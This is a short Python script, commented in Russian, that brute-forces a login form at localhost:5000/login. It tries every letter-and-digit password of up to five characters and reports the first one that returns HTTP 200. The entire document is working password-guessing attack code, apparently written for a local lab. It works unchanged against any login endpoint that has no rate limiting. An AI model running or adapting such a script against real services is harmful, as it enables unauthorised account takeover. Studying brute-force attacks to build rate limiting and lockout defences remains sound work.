import requests
import itertools
import string

# URL сервера
URL = "http://localhost:5000/login"

# Функция для генерации всех возможных комбинаций
def generate_passwords(length):
    chars = string.ascii_letters + string.digits  # Используем буквы и цифры
    for combination in itertools.product(chars, repeat=length):
        yield ''.join(combination)

# Функция для Brute Force атаки
def brute_force_login(max_length=5):
    for length in range(1, max_length + 1):
        for password in generate_passwords(length):
            response = requests.post(URL, data={'password': password})
            if response.status_code == 200:
                print(f"Пароль найден: {password}")
                return
            else:
                print(f"Попытка: {password} - Неверно")
    print("Пароль не найден.")

# Запуск Brute Force атаки
brute_force_login()